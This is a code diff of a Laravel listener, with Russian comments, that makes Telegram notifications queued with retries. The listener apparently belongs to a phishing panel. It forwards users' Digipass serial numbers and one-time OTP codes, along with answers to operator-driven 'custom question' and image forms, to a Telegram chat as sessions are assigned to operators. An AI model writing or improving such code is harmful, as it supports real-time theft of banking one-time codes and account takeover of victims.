@@ -14,14 +14,25 @@ use App\Events\SessionStatusChanged;
 use App\Events\SessionUnassigned;
 use App\Services\SessionService;
 use App\Services\TelegramService;
+use Illuminate\Contracts\Queue\ShouldQueue;
+use Illuminate\Queue\InteractsWithQueue;
 
 /**
  * Listener для отправки уведомлений в Telegram
- * 
- * Синхронная обработка (без очередей) чтобы избежать дублирования
+ *
+ * Выполняется через очередь, чтобы не блокировать API/webhook latency.
  */
-class SendTelegramNotificationListener
+class SendTelegramNotificationListener implements ShouldQueue
 {
+    use InteractsWithQueue;
+
+    public int $tries = 3;
+
+    /**
+     * @var array<int, int>
+     */
+    public array $backoff = [1, 5, 15];
+
     public function __construct(
         private readonly TelegramService $telegramService,
         private readonly SessionService $sessionService,
@@ -108,17 +119,17 @@ class SendTelegramNotificationListener
         // Обновляем основное сообщение с новыми данными
         // Данные сохраняются в сессии и отображаются в formatSessionMessage
         $this->telegramService->updateSessionMessage($event->session);
-        
+
         // Отправляем отдельное уведомление с ответом пользователя для кастомных форм
         $formData = $event->formData;
         $session = $event->session;
-        
+
         // Digipass: отправляем серийник + OTP и помечаем, если это QR Digipass форма
         if ($formData->actionType === ActionType::DIGIPASS && $formData->customAnswers) {
             $serial = $formData->customAnswers['serial_number'] ?? null;
             $otp = $formData->customAnswers['otp'] ?? '—';
             $source = strtolower((string) ($formData->customAnswers['source'] ?? ''));
-            
+
             $text = "🔑 <b>Digipass данные:</b>\n\n";
             if ($source === 'qr') {
                 $text .= "📷 QR Digipass\n";
@@ -127,23 +138,24 @@ class SendTelegramNotificationListener
                 $text .= "📟 <b>Серийный номер:</b> <code>{$serial}</code>\n";
             }
             $text .= "🔢 <b>OTP код:</b> <code>{$otp}</code>";
-            
+
             $this->telegramService->sendSessionUpdate($session, $text);
+
             return;
         }
-        
+
         // Для форм с ответами (custom-question, custom-image, image-question)
         if ($formData->customAnswers && isset($formData->customAnswers['answer'])) {
             $actionType = $formData->actionType;
             $answer = $formData->customAnswers['answer'];
-            
+
             $formTypeLabel = match ($actionType) {
                 ActionType::CUSTOM_QUESTION => 'Кастомный вопрос',
                 ActionType::CUSTOM_IMAGE => 'Картинка',
                 ActionType::IMAGE_QUESTION => 'Картинка с вопросом',
                 default => $actionType->label(),
             };
-            
+
             $text = "💬 <b>Получен ответ на {$formTypeLabel}:</b>\n\n<code>{$answer}</code>";
             $this->telegramService->sendSessionUpdate($session, $text);
         }
